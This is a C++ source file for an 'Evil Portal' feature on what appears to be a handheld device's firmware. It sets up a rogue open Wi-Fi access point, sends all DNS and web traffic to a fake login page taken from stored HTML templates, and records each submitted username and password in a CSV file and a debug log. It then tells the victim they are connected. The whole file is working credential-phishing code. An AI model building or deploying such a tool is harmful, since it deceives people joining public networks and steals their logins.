#include "CaptivePortalActivity.h"

#include <HalStorage.h>
#include <I18n.h>
#include <Logging.h>
#include <WiFi.h>

#include <string>

#include "MappedInputManager.h"
#include "activities/util/KeyboardEntryActivity.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

static CaptivePortalActivity* portalInstance = nullptr;

void CaptivePortalActivity::onEnter() {
  Activity::onEnter();
  RADIO.ensureWifi();
  state = SELECT_TEMPLATE;
  templates.clear();
  selectorIndex = 0;
  capturedCount = 0;
  lastUsername.clear();
  portalInstance = this;
  loadTemplates();
  requestUpdate();
}

void CaptivePortalActivity::onExit() {
  Activity::onExit();
  stopPortal();
  portalInstance = nullptr;
}

void CaptivePortalActivity::loadTemplates() {
  templates.clear();
  Storage.mkdir("/biscuit");
  Storage.mkdir("/biscuit/portals");

  auto dir = Storage.open("/biscuit/portals");
  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    return;
  }

  char name[128];
  for (auto file = dir.openNextFile(); file; file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      file.getName(name, sizeof(name));
      std::string fname(name);
      if (fname.size() > 5 && fname.substr(fname.size() - 5) == ".html") {
        templates.push_back(fname);
      }
    }
    file.close();
  }
  dir.close();
}

void CaptivePortalActivity::startPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsid.c_str());
  delay(100);

  dnsServer = std::make_unique<DNSServer>();
  dnsServer->start(53, "*", WiFi.softAPIP());

  webServer = std::make_unique<WebServer>(80);
  webServer->on("/", HTTP_GET, [this]() { handleRoot(); });
  webServer->on("/login", HTTP_POST, [this]() { handleLogin(); });
  webServer->onNotFound([this]() { handleNotFound(); });
  webServer->begin();

  state = RUNNING;
  LOG_DBG("PORTAL", "Evil Portal started on %s", apSsid.c_str());
}

void CaptivePortalActivity::stopPortal() {
  if (webServer) {
    webServer->stop();
    webServer.reset();
  }
  if (dnsServer) {
    dnsServer->stop();
    dnsServer.reset();
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

void CaptivePortalActivity::handleRoot() {
  std::string path = "/biscuit/portals/" + selectedTemplate;
  if (!Storage.exists(path.c_str())) {
    webServer->send(404, "text/plain", "Template not found");
    return;
  }

  auto file = Storage.open(path.c_str());
  if (!file) {
    webServer->send(500, "text/plain", "Error opening template");
    return;
  }

  size_t fileLen = file.size();
  webServer->setContentLength(fileLen);
  webServer->send(200, "text/html", "");
  static uint8_t buf[512];
  while (file.available()) {
    int bytesRead = file.read(buf, sizeof(buf));
    if (bytesRead <= 0) break;
    webServer->sendContent(reinterpret_cast<const char*>(buf), bytesRead);
  }
  file.close();
}

void CaptivePortalActivity::handleLogin() {
  std::string username = webServer->arg("username").c_str();
  std::string password = webServer->arg("password").c_str();

  logCredentials(username, password);
  capturedCount++;
  lastUsername = username;
  requestUpdate();

  webServer->send(200, "text/html",
                  "<html><body><h1>Thank you</h1><p>You are now connected.</p></body></html>");
}

void CaptivePortalActivity::handleNotFound() {
  // Redirect all requests to the portal
  webServer->sendHeader("Location", "http://192.168.4.1/", true);
  webServer->send(302, "text/plain", "");
}

void CaptivePortalActivity::logCredentials(const std::string& username, const std::string& password) {
  Storage.mkdir("/biscuit");
  const char* logPath = "/biscuit/creds.csv";

  bool exists = Storage.exists(logPath);
  auto file = Storage.open(logPath, O_WRITE | O_CREAT | O_APPEND);
  if (!file) return;

  if (!exists) {
    file.println("timestamp,ssid,username,password");
  }

  String line = String(millis()) + "," + apSsid.c_str() + "," + username.c_str() + "," + password.c_str();
  file.println(line);
  file.close();

  LOG_DBG("PORTAL", "Captured: %s / %s", username.c_str(), password.c_str());
}

void CaptivePortalActivity::loop() {
  if (state == RUNNING) {
    dnsServer->processNextRequest();
    webServer->handleClient();

    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      stopPortal();
      state = STOPPED;
      requestUpdate();
    }
    return;
  }

  if (state == STOPPED) {
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      finish();
    }
    return;
  }

  if (state == SELECT_TEMPLATE) {
    const int count = static_cast<int>(templates.size());

    buttonNavigator.onNext([this, count] {
      if (count > 0) {
        selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count);
        requestUpdate();
      }
    });

    buttonNavigator.onPrevious([this, count] {
      if (count > 0) {
        selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count);
        requestUpdate();
      }
    });

    if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
      if (!templates.empty()) {
        selectedTemplate = templates[selectorIndex];
        state = ENTER_SSID;
        startActivityForResult(
            std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "FreeWiFi", 32),
            [this](const ActivityResult& result) {
              if (result.isCancelled) {
                state = SELECT_TEMPLATE;
                requestUpdate();
                return;
              }
              apSsid = std::get<KeyboardResult>(result.data).text;
              startPortal();
              requestUpdate();
            });
      }
    }

    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      finish();
    }
    return;
  }
}

void CaptivePortalActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  renderer.clearScreen();

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, tr(STR_EVIL_PORTAL));

  if (state == RUNNING || state == STOPPED) {
    const int leftPad = metrics.contentSidePadding;
    int y = metrics.topPadding + metrics.headerHeight + 30;
    const int lineH = 45;

    renderer.drawText(SMALL_FONT_ID, leftPad, y, state == RUNNING ? tr(STR_PORTAL_ACTIVE) : "Stopped", true,
                      EpdFontFamily::BOLD);
    y += lineH;

    renderer.drawText(SMALL_FONT_ID, leftPad, y, "SSID:", true, EpdFontFamily::BOLD);
    renderer.drawText(UI_10_FONT_ID, leftPad + 60, y, apSsid.c_str());
    y += lineH;

    std::string clientsStr = std::string(tr(STR_CLIENTS)) + ": " + std::to_string(WiFi.softAPgetStationNum());
    renderer.drawText(UI_10_FONT_ID, leftPad, y, clientsStr.c_str());
    y += lineH;

    std::string captStr = std::string(tr(STR_CAPTURED)) + ": " + std::to_string(capturedCount);
    renderer.drawText(UI_10_FONT_ID, leftPad, y, captStr.c_str(), true, EpdFontFamily::BOLD);
    y += lineH;

    if (!lastUsername.empty()) {
      std::string lastStr = "Last: " + lastUsername;
      renderer.drawText(UI_10_FONT_ID, leftPad, y, lastStr.c_str());
    }

    const auto labels = mappedInput.mapLabels(tr(STR_EXIT), "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  // SELECT_TEMPLATE
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

  if (templates.empty()) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2 - 15, "No templates found");
    renderer.drawCenteredText(SMALL_FONT_ID, pageHeight / 2 + 15, "Add .html to /biscuit/portals/");
  } else {
    GUI.drawList(
        renderer, Rect{0, contentTop, pageWidth, contentHeight}, static_cast<int>(templates.size()), selectorIndex,
        [this](int i) -> std::string { return templates[i]; }, nullptr);
  }

  const auto labels = mappedInput.mapLabels(tr(STR_BACK), tr(STR_SELECT), tr(STR_DIR_UP), tr(STR_DIR_DOWN));
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
